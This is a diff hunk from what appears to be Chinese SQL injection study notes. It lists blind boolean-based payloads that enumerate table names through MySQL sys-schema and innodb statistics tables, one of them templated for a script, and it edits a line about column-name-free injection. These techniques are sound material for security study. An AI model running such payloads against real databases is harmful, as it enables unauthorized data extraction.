@@ -28,7 +28,7 @@ select group_concat(table_name）from mysql.innodb_table_stats wheredatabase_nam
 1&&ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),1,1))=103
 2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),{},1))={}.format()
 ```
-通过无列名注入获取表group_concat(某一字段所有值)。
+通过无列名注入获取表字段，group_concat(某一字段所有值)。
 <https://www.cnblogs.com/hello-there/p/12918265.html>
 
 ^
